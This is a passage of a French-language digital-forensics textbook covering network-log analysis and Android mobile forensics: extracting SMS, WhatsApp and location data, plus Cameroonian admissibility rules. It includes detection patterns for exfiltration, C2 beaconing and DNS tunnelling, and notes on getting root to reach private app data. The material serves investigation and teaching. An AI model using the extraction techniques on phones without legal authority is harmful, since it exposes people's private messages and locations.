    -T fields -e frame.time -e ftp.request.command \
    -e ftp.request.arg

# Resultat type :
# 02:20:15  USER   admin
# 02:20:16  PASS   admin123  <- mot de passe en clair !
# 02:20:17  CWD    /confidential/RH/
# 02:20:18  RETR   salaires_2026.xlsx  <- telechargement fichier confidentiel

# Extraire les fichiers transferes via FTP-DATA (port 20)
tshark -r capture.pcap --export-objects "ftp-data,/output/ftp_objects/"

# Note : FTPS (FTP over TLS) chiffre le contenu mais les commandes
# (USER, PASS, fichiers) restent potentiellement visibles si TLS
# est mal configure (certificat auto-signe, version obsolete)
\end{lstlisting}

% ============================================================================
\section{Analyse des Logs sans Capture Complète}
\label{sec:analyse-logs}
% ============================================================================

En l'absence de capture pcap (la situation la plus courante en
investigation~: le réseau n'était pas monitoré au moment de l'incident),
les logs de périphériques réseau deviennent la seule source d'information
réseau. Ils sont moins riches, mais souvent disponibles.

\subsection{Logs de pare-feu}

\begin{boxoutils}{Analyse de logs de pare-feu (format syslog/Palo Alto)}
\begin{lstlisting}[language=bash_forensique]
# Logs de pare-feu au format syslog standard
# Structure typique : timestamp src_ip dst_ip src_port dst_port action

# Extraire toutes les connexions vers une IP suspecte
grep "185.220.XX.XX" /var/log/firewall.log | \
    grep "ACCEPT\|ALLOW" | \
    awk '{print $1,$2,$3,$4,$5,$6}' | sort -k3 -n

# Calculer le volume par connexion (bytes transferes)
grep "185.220.XX.XX" /var/log/firewall.log | \
    awk '{bytes+=$NF} END {print "Total bytes:", bytes}'

# Connexions refusees (tentatives d'intrusion ou scan)
grep "DENY\|BLOCK\|DROP" /var/log/firewall.log | \
    awk '{print $5}' | sort | uniq -c | sort -rn | head -20
# Top IP sources bloquees : peut identifier un scanner

# Detecter le beaconing dans les logs pare-feu
grep "185.220.XX.XX" /var/log/firewall.log | \
    awk '{print $1}' | \
    awk 'BEGIN{FS=":"}{printf "%s%s%s\n",$1,$2,$3}' | \
    sort | uniq -c | sort -rn
# Connexions recurrentes a la meme minute -> beaconing probable
\end{lstlisting}
\end{boxoutils}

\subsection{Logs de proxy web}

\begin{boxoutils}{Analyse de logs de proxy Squid/Bluecoat}
\begin{lstlisting}[language=bash_forensique]
# Format Squid access.log :
# timestamp elapsed client action/code bytes method url

# Sites les plus consultés (volume)
awk '{print $7}' /var/log/squid/access.log | \
    awk -F/ '{print $3}' | sort | uniq -c | sort -rn | head -20

# Telechargements volumineux (potentielle exfiltration)
awk '$5 > 10000000 {print $3,$7,$5}' /var/log/squid/access.log
# -> connections > 10 Mo vers des URLs externes

# User-Agents inhabituels (malware, outils d'attaque)
awk '{print $NF}' /var/log/squid/access.log | sort | uniq -c | \
    sort -rn | grep -iv "Mozilla\|Chrome\|Firefox\|Safari"
# Resultat suspect : "python-requests/2.28.0" -> script automatise
#                    "curl/7.74.0" -> ligne de commande
#                    "Go-http-client/1.1" -> outil Go

# Connexions hors horaires de bureau
awk '$1 >= 1678668000 && $1 <= 1678675200' /var/log/squid/access.log
# (timestamps UNIX pour 00h00-02h00 le 13 mars 2026)
\end{lstlisting}
\end{boxoutils}

\subsection{Logs DNS~: reconstituer l'activité réseau par les noms}

\begin{lstlisting}[language=bash_forensique,
    caption={Analyse de logs DNS (BIND / Windows DNS)}]
# Logs de requetes DNS (BIND format)
grep "QUERY" /var/log/named/query.log | \
    awk '{print $5}' | sort | uniq -c | sort -rn | head -30

# Domaines enregistres recemment (DGA / domaines d'attaque)
# Les DGA (Domain Generation Algorithms) produisent des noms aleatoires
grep "QUERY" /var/log/named/query.log | \
    awk '{print $5}' | \
    awk -F. '{
        n = split($0, a, ".");
        label = a[n-1] "." a[n];  # domaine principal
        sub_label = a[1];          # premier sous-domaine
        if (length(sub_label) > 15) print $0  # sous-domaine long
    }'

# Volume de requetes par client (qui fait beaucoup de DNS ?)
grep "QUERY" /var/log/named/query.log | \
    awk '{print $4}' | sort | uniq -c | sort -rn | head -10
# Si une machine fait 10x plus de requetes que les autres : suspect

# Synchroniser DNS logs avec timeline systeme (Ch. 14)
# Timestamp DNS 02:14:07 -> resolution medequip-portugal.com
# Timestamp MFT 02:17:44 -> execution enc_all.ps1
# Correlation : la resolution DNS precede l'execution de 3 min 37 sec
\end{lstlisting}

% ============================================================================
\section{Corrélation Temporelle Multi-Sources}
\label{sec:correlation-temporelle}
% ============================================================================

La puissance de la forensique réseau réside dans la \textbf{corrélation}
entre les sources réseau et les sources système. Chaque source seule
est un fragment~; la corrélation révèle l'image complète.

\begin{tableaucours}{p{2.5cm}p{4.0cm}p{5.0cm}}{%
    \tableauHeader{Source} &
    \tableauHeader{Information réseau} &
    \tableauHeader{Corrélation avec Ch.~\ref{chap:for-sys}}
}
\textbf{Capture pcap} & IP, ports, contenu des sessions &
    Corrélation temporelle~: connexion TCP à 02h14:09 $\leftrightarrow$
    entrée journald SSH Accepted à 02h14:09 \\
\textbf{Logs pare-feu} & Flux autorisés/refusés, volumes &
    Corrélation volumétrique~: 45~Mo sortants à 02h19
    $\leftrightarrow$ \texttt{\$UsnJrnl} accès 847~fichiers à 02h18 \\
\textbf{Logs DNS} & Noms résolus, clients, timestamps &
    Corrélation causale~: résolution \texttt{malware.domain.com}
    à 02h13~$\to$ connexion vers cette IP à 02h14 \\
\textbf{Logs proxy} & URLs, User-Agents, volumes &
    Corrélation comportementale~: User-Agent \texttt{python-requests}
    depuis machine du comptable = inhabituel \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~15.3 --- Corrélation temporelle multi-sources}\end{center}

\begin{boxscenario}{Timeline réseau + système~: Opération MVOM complète}
En fusionnant la timeline système (Ch.~\ref{chap:for-sys}) avec les
sources réseau de ce chapitre, la séquence complète de l'attaque émerge~:

\begin{lstlisting}[language=bash_forensique]
# Timeline fusionnee (source en brackets)
02:13:45  [DNS log]     Resolution: update.windowscdn.net -> 185.220.XX.XX
02:14:02  [journald]    SSH Failed password from 185.220.XX.XX (x7)
02:14:09  [journald]    SSH Accepted password root from 185.220.XX.XX
02:14:09  [pcap]        TCP SYN dst=185.220.XX.XX:4444 (C2 channel)
02:16:50  [$UsnJrnl]    FileCreate: enc_all.ps1
02:17:40  [UserAssist]  powershell.exe executed
02:17:44  [Prefetch]    enc_all.ps1 executed
02:18:31  [$UsnJrnl]    847 fichiers .docx DataOverwrite (chiffrement)
02:19:05  [firewall]    ALLOW 10.0.0.15 -> 185.220.XX.XX:443 45.2MB
02:19:05  [proxy log]   POST https://update.windowscdn.net 45231400 bytes
02:19:48  [pcap]        TCP FIN 185.220.XX.XX:4444 (deconnexion C2)
\end{lstlisting}

\textbf{Reconstruction narrative}~: L'attaquant a d'abord effectué
une résolution DNS pour préparer sa connexion (02h13). Il a obtenu
un accès root par brute-force SSH (02h14). Il a immédiatement
ouvert un canal C2 (port~4444, 02h14) par lequel il a téléchargé
et exécuté le ransomware (02h16--02h18). Il a exfiltré 45~Mo de
données (vraisemblablement les fichiers avant chiffrement, 02h19)
avant de fermer la connexion C2 (02h19:48).
\end{boxscenario}

\begin{boxjuris}
\textbf{Admissibilité des logs réseau en droit camerounais}

Les logs de pare-feu, proxy et serveurs DNS constituent des ``données
informatiques'' au sens de l'art.~4 de la \loicam{2010/012}.
Leur admissibilité en tant que preuves est soumise aux mêmes
conditions que tout artefact numérique~:
\begin{enumerate}
    \item Origine légale~: les logs doivent avoir été conservés dans
          le cadre normal de l'exploitation du réseau (art.~27
          \loicam{2024/017}~: obligation de sécurité et traçabilité)~;
    \item Intégrité~: hash SHA-256 calculé au moment de la saisie~;
    \item Chaîne de custody documentée depuis le serveur jusqu'au
          tribunal~;
    \item Expert judiciaire agréé pour attester de l'authenticité
          et de l'interprétation technique.
\end{enumerate}
\end{boxjuris}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Position de la sonde d'abord}~: port SPAN (tout
          le switch)~; TAP WAN (tout le trafic Internet)~;
          agent hôte (tout le trafic de la machine, chiffré compris).
          Capturer au mauvais endroit~= ne rien voir.

    \item \textbf{Follow TCP Stream}~: reconstruit la session complète.
          \texttt{--export-objects http} extrait les fichiers transférés
          avec leurs hash. Calculer le SHA-256 de chaque objet et
          soumettre sur VirusTotal.

    \item \textbf{Exfiltration~:} détecter par le volume (POST
          volumineux)~; l'entropie du contenu (contenu chiffré)~;
          le ratio upload/download anormal.

    \item \textbf{Tunneling DNS}~: sous-domaines de~$>$~50~caractères~;
          volume anormal de requêtes vers un même domaine~;
          réponses TXT avec contenu binaire.

    \item \textbf{Beaconing}~: intervalles réguliers de connexion vers
          la même destination. Calculer les intervalles et leur
          distribution~: un malware produit une distribution
          quasi-normale centrée sur son intervalle~; le trafic
          légitime est aléatoire.

    \item \textbf{Logs sans capture}~: logs pare-feu (flux, volumes)~;
          proxy (URLs, User-Agents)~; DNS (domaines résolus) constituent
          des sources complémentaires indispensables quand pas de pcap.

    \item \textbf{Corrélation temporelle}~: la valeur de la forensique
          réseau vient de la croisé avec la timeline système
          (Ch.~\ref{chap:for-sys}). La convergence temporelle entre
          log DNS~$\to$ log pare-feu~$\to$ journald~$\to$
          \texttt{\$UsnJrnl} est une preuve bien plus robuste que
          chaque source isolée.

    \item \textbf{Admissibilité}~: logs réseau~= données informatiques
          (art.~4 Loi~2010/012)~; mêmes exigences~: intégrité (hash),
          custody, expert agréé.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~15.1 --- Position de sonde \niveaubase}]
Une entreprise de Yaoundé suspecte une exfiltration de données depuis
un poste de travail du département comptabilité. Le réseau comprend~:
un routeur Internet, un switch principal, 40~postes de travail Windows,
un serveur de fichiers, et un serveur de messagerie.
\begin{enumerate}[(a)]
    \item Où positionneriez-vous la sonde de capture pour voir tout
          le trafic Internet du poste suspect~?
    \item Pourrait-on capturer le trafic interne entre le poste suspect
          et le serveur de fichiers avec cette même sonde~? Si non, comment~?
    \item Si vous n'avez pas accès au switch pour un SPAN port, quelles
          alternatives avez-vous pour capturer le trafic~?
    \item À quel moment de l'incident est-il trop tard pour une capture
          réseau (et quelles sources de substitution utiliser)~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~15.2 --- Analyse de capture \niveaumoyen}]
La capture \texttt{incident\_baobab.pcap} de l'Opération BAOBAB
(Chapitre~\ref{chap:norm-glob}) est disponible. \texttt{tshark -r
incident\_baobab.pcap -q -z "conv,tcp"} révèle~:
\begin{lstlisting}[language=bash_forensique]
# Extrait conversations TCP :
10.0.0.42:52341 <-> 196.200.XX.XX:443   847 pkts  2.3 MB  <->  4.1 KB
10.0.0.42:52411 <-> 196.200.XX.XX:443   848 pkts  2.3 MB  <->  4.2 KB
10.0.0.42:52478 <-> 196.200.XX.XX:443   847 pkts  2.3 MB  <->  4.1 KB
[...] (total : 47 conversations similaires)
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Quelle anomalie identifiez-vous dans ces conversations~?
          À quoi ressemble ce pattern~?
    \item Calculez l'intervalle approximatif entre les connexions.
    \item Quelles commandes tshark utiliseriez-vous pour~: (i)~extraire
          les intervalles entre connexions~; (ii)~vérifier si le
          contenu est chiffré~; (iii)~identifier le User-Agent si
          ces connexions sont HTTP/S~?
    \item Rédigez la constatation forensique correspondante (sans
          interprétation) et l'analyse avec niveau de confiance.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~15.3 --- Corrélation multi-sources \niveauexpert}]
Vous disposez des sources suivantes pour l'Opération WOURI~:
\begin{itemize}
    \item Capture \texttt{sotradi.pcap} (trafic réseau 14--15~janvier 2026)~;
    \item Logs pare-feu Palo Alto (30~jours)~;
    \item Logs proxy Bluecoat (30~jours)~;
    \item Logs DNS interne (30~jours)~;
    \item Image forensique E01 du poste du comptable~;
    \item Dump RAM du serveur de messagerie.
\end{itemize}
\begin{enumerate}[(a)]
    \item Construisez un plan d'investigation réseau~: dans quel ordre
          analyser ces sources~? Quelle question spécifique posez-vous
          à chaque source~?
    \item Comment corréleriez-vous temporellement les logs DNS avec
          le contenu SMTP de la capture pcap pour établir une
          chronologie de l'attaque BEC~?
    \item Appliquez la grille CRO à la décision d'extraire et d'analyser
          le contenu des pièces jointes SMTP identifiées dans la
          capture~: qui peut y accéder~? Quelle base légale cite-t-on~?
    \item Rédigez la section Constatations réseau de votre rapport,
          couvrant la période 14h00--15h00 du 15~janvier~2026.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le Chapitre~\ref{chap:anti-for} (Anti-Forensique
et Contre-Mesures) traite l'autre côté du miroir~: les techniques
qu'un attaquant sophistiqué utilise pour effacer les traces dans les
systèmes (Ch.~\ref{chap:for-sys}) et le réseau (ce chapitre)~---
et comment les détecter malgré tout. La connaissance des techniques
d'anti-forensique renforce la capacité à les contrer ET à les documenter
quand elles ont été utilisées.
\end{boxinfo}

       
        % ============================================================================
% Fichier  : partie4/P04_C16_forensique_mobile.tex
% Titre    : Forensique Mobile -- Android et iOS
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : Ch. 9 (ADB, 4 niveaux acquisition NIST, iOS contraintes)
%            M5_Investigation_Numerique_PNC.docx (BLOC mobile)
%            Affaires MBONGO (téléphone EV-002), BAOBAB (MoMo fraud)
% Positionnement : Ch. 9 a couvert l'ACQUISITION mobile (ADB pull,
%                  sauvegarde, 4 niveaux). Ce chapitre couvre l'ANALYSE :
%                  que faire de ce qu'on a extrait ? Bases de données SQLite
%                  des applications, artefacts WhatsApp, artefacts iOS,
%                  géolocalisation, artefacts Mobile Money.
% ============================================================================

\chapter{Forensique Mobile --- Android et iOS}
\label{chap:for-mob}

\epigraph{%
    « Le téléphone portable est le journal intime du XXI\textsuperscript{e}
    siècle --- et bien plus révélateur. »%
}{--- Adage de la forensique mobile}

\niveauChapitre{Intermédiaire}{%
    Chapitre~\ref{chap:acq} (acquisition mobile~: ADB, 4~niveaux,
    iOS) indispensable. Ce chapitre couvre l'analyse post-acquisition.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre l'architecture de stockage Android~: partitions,
          systèmes de fichiers, emplacements des données applicatives.
    \item Analyser les bases de données SQLite des applications
          critiques~: SMS, WhatsApp, contacts, calendrier.
    \item Reconstruire une chronologie d'activité mobile depuis
          les journaux système Android et les métadonnées EXIF.
    \item Identifier et exploiter les artefacts de géolocalisation~:
          historique GPS, réseaux Wi-Fi, antennes GSM.
    \item Analyser les artefacts spécifiques Mobile Money (MTN MoMo,
          Orange Money) pour les fraudes financières numériques.
    \item Maîtriser les particularités forensiques d'iOS~: sauvegarde
          iTunes, données iCloud, limitations techniques.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Positionnement~: de l'extraction à l'analyse}
% ============================================================================

Le Chapitre~\ref{chap:acq} s'est terminé sur \texttt{adb pull /sdcard/}
et la liste des 9~commandes ADB essentielles. Ce chapitre part de là~:
vous avez l'extraction. Que contient-elle~? Où sont les preuves~? Comment
les lire, les dater, les corroborer~?

En Afrique subsaharienne, l'écrasante majorité des infractions numériques
implique un téléphone mobile plutôt qu'un ordinateur~: fraudes MoMo,
harcèlement sur WhatsApp, arnaques Facebook, SIM~swapping. Maîtriser
la forensique mobile n'est pas optionnel --- c'est la compétence la
plus immédiatement utile sur le terrain camerounais.

\separateur

% ============================================================================
\section{Architecture de Stockage Android}
\label{sec:architecture-android}
% ============================================================================

\subsection{Les partitions essentielles}

Un téléphone Android typique présente plusieurs partitions dont deux
sont centrales pour la forensique~:

\begin{tableaucours}{p{2.8cm}p{3.5cm}p{5.5cm}}{%
    \tableauHeader{Partition} &
    \tableauHeader{Contenu} &
    \tableauHeader{Accessibilité forensique}
}
\texttt{/data} & Données applicatives, comptes,
    bases de données SQLite, paramètres &
    \textbf{Nécessite root ou extraction physique.}
    Contient les données les plus sensibles~: messages,
    mots de passe, tokens d'authentification. \\
\texttt{/sdcard} (\texttt{/storage/emulated/0}) &
    Photos, vidéos, téléchargements, backups WhatsApp &
    \textbf{Accessible via ADB sans root.}
    \texttt{adb pull /sdcard/} \\
\texttt{/system} & OS Android, applications système &
    Lecture seule~; peu utile en investigation courante \\
\texttt{/cache} & Cache des applications &
    Volatile~; contenu non garanti après redémarrage \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~16.1 --- Partitions Android et accessibilité forensique}\end{center}

\begin{boxalert}
\textbf{La limite fondamentale de l'extraction ADB sans root}

\texttt{adb pull /sdcard/} donne accès à la carte SD virtuelle
(\texttt{/storage/emulated/0}). Les données applicatives les plus
importantes --- SMS, contacts, messages WhatsApp, tokens de connexion
--- sont dans \texttt{/data/data/<package>} et \textbf{ne sont pas
accessibles sans root}.

\textbf{Conséquence pratique~:} pour une affaire impliquant les messages
d'une application (WhatsApp, SMS, Messenger), l'extraction ADB logique
est insuffisante sauf si~: (a)~le téléphone était rooté, (b)~une
sauvegarde ADB a été activée~(\texttt{adb backup -all -shared}), ou
(c)~les backups WhatsApp ont été sauvegardés sur \texttt{/sdcard}
(comportement par défaut de WhatsApp).
\end{boxalert}

\subsection{Emplacements clés des données applicatives}

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.0cm}}{%
    \tableauHeader{Application} &
    \tableauHeader{Chemin (root requis)} &
    \tableauHeader{Chemin accessible sans root}
}
SMS & \texttt{/data/data/com.android.providers.telephony/databases/mmssms.db} &
    \texttt{adb shell content query --uri content://sms/} \\
Contacts & \texttt{/data/data/com.android.providers.contacts/databases/contacts2.db} &
    \texttt{adb shell content query --uri content://contacts/} \\
WhatsApp messages & \texttt{/data/data/com.whatsapp/databases/msgstore.db} &
    \texttt{/sdcard/WhatsApp/Databases/msgstore.db.crypt15} (chiffré) \\
WhatsApp médias & \texttt{/data/data/com.whatsapp/} &
    \texttt{/sdcard/WhatsApp/Media/} (non chiffré) \\
Appels & \texttt{/data/data/com.android.providers.contacts/databases/contacts2.db} &
    \texttt{adb shell content query --uri content://call\_log/} \\
Localisation (Google) & \texttt{/data/data/com.google.android.gms/} &
    Google Timeline via réquisition (legalprocess.google.com) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~16.2 --- Emplacements des données applicatives}\end{center}

% ============================================================================
\section{Analyse des Bases de Données SQLite}
\label{sec:sqlite}
% ============================================================================

Les applications Android stockent la quasi-totalité de leurs données
dans des fichiers SQLite (extension \texttt{.db}). Ces bases de données
sont le c\oe ur de l'analyse forensique mobile.

\subsection{Analyser les SMS~: \texttt{mmssms.db}}

\begin{boxoutils}{Analyse de mmssms.db --- base de données SMS}
\begin{lstlisting}[language=bash_forensique]
# Ouverture de la base de donnees SMS (extraite via ADB ou backup)
sqlite3 /output/extraction/mmssms.db

# Structure de la table SMS
.schema sms
-- CREATE TABLE sms (
--   _id INTEGER PRIMARY KEY,
--   thread_id INTEGER,  -- identifiant conversation
--   address TEXT,       -- numero de telephone
--   date INTEGER,       -- timestamp Unix en millisecondes
--   date_sent INTEGER,
--   protocol INTEGER,
--   read INTEGER,       -- 1=lu, 0=non lu
--   type INTEGER,       -- 1=recu, 2=envoye, 3=brouillon
--   body TEXT,          -- contenu du message
-- )

-- Tous les SMS avec horodatage lisible
SELECT
    datetime(date/1000, 'unixepoch', 'localtime') AS date_heure,
    address AS correspondant,
    CASE type
        WHEN 1 THEN 'Recu'
        WHEN 2 THEN 'Envoye'
        WHEN 3 THEN 'Brouillon'
    END AS type_sms,
    body AS contenu
FROM sms
ORDER BY date;

-- SMS contenant des mots-cles suspects
SELECT datetime(date/1000, 'unixepoch') AS date,
       address, body
FROM sms
WHERE body LIKE '%code%' OR body LIKE '%OTP%'
   OR body LIKE '%virement%' OR body LIKE '%MoMo%'
ORDER BY date;
\end{lstlisting}
\end{boxoutils}

\subsection{Analyser WhatsApp~: \texttt{msgstore.db}}

\begin{boiteRemarque}{Le déchiffrement des backups WhatsApp}
WhatsApp stocke ses backups locaux au format \texttt{msgstore.db.crypt15}
(chiffrement AES-256-GCM). La clé est stockée dans
\texttt{/data/data/com.whatsapp/files/key} --- inaccessible sans root.

\textbf{Cas où le backup est analysable sans root~:}
\begin{enumerate}
    \item Téléphone \textbf{rooté}~: extraire directement \texttt{msgstore.db}
          depuis \texttt{/data/data/com.whatsapp/databases/}.
    \item \textbf{Sauvegarde ADB} (si activée)~: \texttt{adb backup
          -apk com.whatsapp} extrait l'application et ses données.
    \item \textbf{WhatsApp Web actif}~: la session Web peut révéler
          le contenu en temps réel (pas forensique, mais utile en
          surveillance légale autorisée).
    \item \textbf{Déchiffrement avec la clé extraite}~: si root obtenu
          via exploit, extraire \texttt{key} puis déchiffrer avec
          l'outil \texttt{whatsapp-viewer}.
\end{enumerate}
\end{boiteRemarque}

\begin{boxoutils}{WhatsApp --- base non chiffrée (root) ou médias}
\begin{lstlisting}[language=bash_forensique]
-- Analyse de msgstore.db (WhatsApp, necesssite root ou backup)
sqlite3 /output/msgstore.db

-- Messages recus et envoyes avec horodatage
SELECT
    datetime(timestamp/1000, 'unixepoch', 'localtime') AS date_heure,
    jid AS correspondant,    -- format : 237XXXXXXXXX@s.whatsapp.net
    CASE from_me
        WHEN 0 THEN 'Recu'
        WHEN 1 THEN 'Envoye'
    END AS direction,
    data AS message_texte
FROM messages
WHERE data IS NOT NULL
ORDER BY timestamp;

-- Groupes WhatsApp et participants
SELECT
    g.subject AS nom_groupe,
    m.jid AS membre,
    datetime(m.timestamp/1000, 'unixepoch') AS date_ajout
FROM group_participants_history m
JOIN chat g ON g.jid = m.gjid
ORDER BY g.subject, m.timestamp;

-- Medias envoyes/recus (avec chemins de fichier)
SELECT
    datetime(timestamp/1000, 'unixepoch') AS date,
    jid, message_type, media_caption, local_path
FROM messages
WHERE message_type IN (1,2,3)  -- image, audio, video
ORDER BY timestamp;
\end{lstlisting}

\textbf{Médias WhatsApp accessibles sans root~:}
\begin{lstlisting}[language=bash_forensique]
# Les medias (photos, videos, documents) envoyes/recus par WhatsApp
# sont stockes en CLAIR sur /sdcard/WhatsApp/Media/
ls /mnt/extraction/WhatsApp/Media/
# WhatsApp Images/
# WhatsApp Video/
# WhatsApp Documents/
# WhatsApp Audio/

# Hash SHA-256 de tous les medias
find /mnt/extraction/WhatsApp/Media/ -type f \
    -exec sha256sum {} \; > /output/whatsapp_media_hashes.txt

# Verification sur VirusTotal (documents/APK suspects)
# Extraction des metadonnees EXIF des images
exiftool /mnt/extraction/WhatsApp/Media/WhatsApp\ Images/*.jpg \
    | grep -i "GPS\|Date\|Camera\|Make"
\end{lstlisting}
\end{boxoutils}

\subsection{Analyser les journaux d'appels}

\begin{lstlisting}[language=bash_forensique,
    caption={Extraction des journaux d'appels}]
# Via ADB content query (sans root)
adb shell content query --uri content://call_log/calls \
    --projection "number,type,date,duration,name" \
    > /output/call_log.txt

# Interpretation du champ type :
# 1 = Appel entrant
# 2 = Appel sortant
# 3 = Appel manque
# 4 = Messagerie vocale

# Analyse des appels vers un numero suspect
adb shell content query --uri content://call_log/calls \
    --where "number='23767XXXXXXX'" \
    --projection "date,type,duration"

# Convertir les timestamps
# date en millisecondes Unix -> datetime
python3 -c "
from datetime import datetime
with open('/output/call_log.txt') as f:
    for line in f:
        if 'date' in line:
            ts = int(line.split('=')[1].split(',')[0])
            print(datetime.fromtimestamp(ts/1000))
"
\end{lstlisting}

% ============================================================================
\section{Géolocalisation et Mobilité}
\label{sec:geolocalisation}
% ============================================================================

\subsection{Métadonnées EXIF des photos}

Les photos prises avec un smartphone embarquent souvent les coordonnées
GPS dans les métadonnées EXIF~--- une source précieuse pour établir
où se trouvait le suspect (ou la victime) à un moment donné.

\begin{boxoutils}{Extraction et visualisation des métadonnées EXIF}
\begin{lstlisting}[language=bash_forensique]
# Extraire les metadonnees GPS de toutes les photos
exiftool -csv -GPS* /mnt/extraction/DCIM/Camera/*.jpg \
    > /output/photo_gps.csv

# Contenu type du CSV :
# SourceFile,GPSLatitude,GPSLongitude,GPSAltitude,DateTimeOriginal
# IMG_20260313_021705.jpg,3.8480 N,11.5021 E,741 m,2026:03:13 02:17:05

# Convertir en format decimal pour Google Maps
exiftool -p '$GPSLatitude#,$GPSLongitude#,$DateTimeOriginal $FileName' \
    /mnt/extraction/DCIM/Camera/*.jpg

# Photo prise a 02:17:05 le 13 mars 2026 -> coordonnees GPS
# Utiliser Google Maps ou QGIS pour visualiser le trajet
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{Cas MBONGO --- localisation via EXIF}
L'extraction ADB du téléphone de MBONGO Joseph (EV-002,
Chapitre~\ref{chap:custody}) révèle 15~photos dans
\texttt{/sdcard/WhatsApp/Media/WhatsApp Images/}. L'analyse EXIF
de \texttt{IMG-20260313-WA0003.jpg} (une photo d'un relevé bancaire)
montre~:

\begin{lstlisting}[language=bash_forensique]
exiftool IMG-20260313-WA0003.jpg
# GPS Latitude   : 3 deg 51' 37.50" N   (3.8604 N)
# GPS Longitude  : 11 deg 30' 08.40" E  (11.5023 E)
# Create Date    : 2026:01:15 14:28:33
# Camera Model   : Samsung Galaxy A53
\end{lstlisting}

\textbf{Constatation~:} la photo \texttt{IMG-20260313-WA0003.jpg}
a été prise le 15~janvier~2026 à 14h28~min~33s à des coordonnées GPS
de \texttt{3.8604°N / 11.5023°E}, correspondant au quartier Akwa,
Douala (vérification sur OpenStreetMap). Le suspect affirmait être à
Yaoundé ce jour-là. La date et les coordonnées sont en cohérence directe
avec l'horodatage de l'email de phishing analysé dans l'affaire WOURI
(14h28~min, même secteur géographique).
\end{boxscenario}

\subsection{Historique de localisation Google}

Google enregistre la position des appareils Android dans Google Maps
Timeline (si la fonction est activée). Ces données sont accessibles
de deux façons~:

\begin{enumerate}
    \item \textbf{Via le compte Google du suspect} (si ses identifiants
          sont connus ou si son téléphone est déverrouillé)~:
          \texttt{myactivity.google.com} ou \texttt{timeline.google.com}.
    \item \textbf{Via réquisition légale à Google}~:
          \texttt{legalprocess.google.com} --- délai~: 10--30~jours~;
          base légale~: art.~57 \loicam{2010/012} (réquisition aux
          fournisseurs de services numériques).
\end{enumerate}

\subsection{Données réseau~: Wi-Fi et antennes GSM}

\begin{boxoutils}{Artefacts réseau sur Android}
\begin{lstlisting}[language=bash_forensique]
# Historique des reseaux Wi-Fi connus (sans root)
adb shell cat /data/misc/wifi/WifiConfigStore.xml
# Ou accessible dans le backup ADB :
# /apps/com.android.providers.settings/db/settings.db

# Analyse du fichier wpa_supplicant (reseaux Wi-Fi)
# Contient : SSID, BSSID, mot de passe (hash), dates de connexion
# Chaque SSID peut etre localise via les bases BSSID publiques
# (Wigle.net, Google Maps Wi-Fi API)

# Journaux des antennes GSM (Cell ID log)
# Disponible via Google Location History (réquisition)
# Ou sur certains appareils dans /data/logger/
# Format : timestamp, MCC, MNC, LAC, Cell_ID
# Convertir Cell_ID en position via opencellid.org

# Exemple de requete OpenCelliD API
curl "https://opencellid.org/cell/get?key=YOUR_KEY
    &mcc=624&mnc=01&lac=9001&cellid=12345"
# -> latitude, longitude de l'antenne (precision : 50-1000 m)
\end{lstlisting}
\end{boxoutils}

\begin{boxjuris}
\textbf{Données de localisation et vie privée~: cadre légal camerounais}

Les données de localisation (GPS, antennes GSM, Wi-Fi) constituent des
données à caractère personnel au sens de l'art.~5 de la \loicam{2024/017}
(\textit{toute information permettant d'identifier directement ou
indirectement une personne physique}). Leur collecte et traitement
en contexte forensique doivent respecter~:
\begin{itemize}
    \item Art.~52 \loicam{2010/012}~: autorisation judiciaire préalable~;
    \item Art.~57 \loicam{2010/012}~: réquisition formelle à l'opérateur~;
    \item Art.~9--11 \loicam{2024/017}~: finalité et proportionnalité.
\end{itemize}
\textbf{Point de vigilance~:} l'historique de localisation obtenu depuis
le téléphone saisi est admissible (l'appareil a été légalement saisi).
Mais demander l'historique de localisation à l'opérateur ou à Google
nécessite une réquisition judiciaire distincte.
\end{boxjuris}

% ============================================================================
\section{Artefacts Mobile Money~: MoMo, Orange Money}
\label{sec:mobile-money}
% ============================================================================

Les fraudes Mobile Money représentent la majorité des affaires numériques
en Afrique subsaharienne. La forensique mobile appliquée à ces fraudes
présente des spécificités importantes.

\subsection{Où sont stockées les données Mobile Money}

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Opérateur / Données} &
    \tableauHeader{Source primaire} &
    \tableauHeader{Source secondaire (réquisition)}
}
MTN MoMo --- SMS de confirmation & \texttt{mmssms.db} &
    MTN Cameroun~; art.~57 Loi~2010 \\
MTN MoMo --- Historique transactions &
    Application MTN MoMo (\texttt{/data/data/com.mtn.mobile.cm/}) &
    Réquisition MTN Cameroun (CELLCOM) \\
Orange Money --- SMS &
    \texttt{mmssms.db} (SMS OTP, confirmations) &
    Orange Cameroun~; art.~57 Loi~2010 \\
Orange Money --- Transactions &
    Application Orange Money &
    Réquisition Orange Cameroun \\
Historique USSD &
    Non stocké sur l'appareil & \textbf{Uniquement via l'opérateur}~;
    réquisition indispensable \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~16.3 --- Sources des données Mobile Money}\end{center}

\begin{boxoutils}{Extraction des SMS MoMo depuis mmssms.db}
\begin{lstlisting}[language=bash_forensique]
-- Tous les SMS de MTN MoMo (numeroMTN = +237 670 000 000)
SELECT
    datetime(date/1000, 'unixepoch', 'localtime') AS date_heure,
    address AS expediteur,
    body AS contenu_sms
FROM sms
WHERE address = '670000000'      -- numero MoMo MTN Cameroun
   OR address LIKE '+23767%'
   OR body LIKE '%MoMo%' OR body LIKE '%MTN%'
ORDER BY date;

